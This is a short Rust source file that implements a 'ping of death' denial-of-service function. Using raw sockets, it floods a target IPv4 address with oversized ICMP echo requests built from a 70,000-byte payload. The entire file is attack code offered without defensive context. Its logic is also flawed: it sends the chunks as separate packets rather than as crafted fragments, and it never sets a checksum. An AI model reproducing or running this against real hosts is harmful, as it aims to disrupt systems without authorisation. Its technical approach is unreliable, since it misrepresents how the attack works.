use pnet::{
    packet::{
        icmp::{
            echo_request,
            IcmpPacket,
            MutableIcmpPacket,
            IcmpTypes
        },
        ip::IpNextHeaderProtocols,
        MutablePacket,
        Packet
    },
    transport::{
        transport_channel,
        TransportChannelType,
        TransportProtocol
    }
};

use std::{
    net::Ipv4Addr,
    error::Error
};

pub fn send_ping_of_death(target_ip: Ipv4Addr) -> Result<(), Box<dyn Error>>{
    const OVERSIZED_PAYLOAD_SIZE: usize = 70000;
    const MAX_FRAGMENT_SIZE: usize = 65500;
    let oversized_payload = vec![0x41; OVERSIZED_PAYLOAD_SIZE];

    // create a transport channel to sending raw packet
    let protocol = TransportChannelType::Layer4(TransportProtocol::Ipv4(IpNextHeaderProtocols::Icmp));
    let (mut tx, _) = transport_channel(65535, protocol)?;

    for (i, chunk) in oversized_payload.chunks(MAX_FRAGMENT_SIZE).enumerate() {
        // allocate a mutable buffer for the ICMP packet
        let mut packet_buffer = vec![0u8; chunk.len() + 8];
        let mut icmp_packet = MutableIcmpPacket::new(&mut packet_buffer).ok_or("Failed to create ICMP packet")?;
        // build the icmp packet
        build_icmp_packet(&mut icmp_packet, &chunk);
        // send the packet
        tx.send_to(icmp_packet, std::net::IpAddr::V4(target_ip))?;
        println!("{}", chunk.len());
    }
    Ok(())
}

fn build_icmp_packet(icmp_packet: &mut MutableIcmpPacket, payload: &[u8]) {
    icmp_packet.set_icmp_type(IcmpTypes::EchoRequest);
    icmp_packet.set_payload(payload);
}
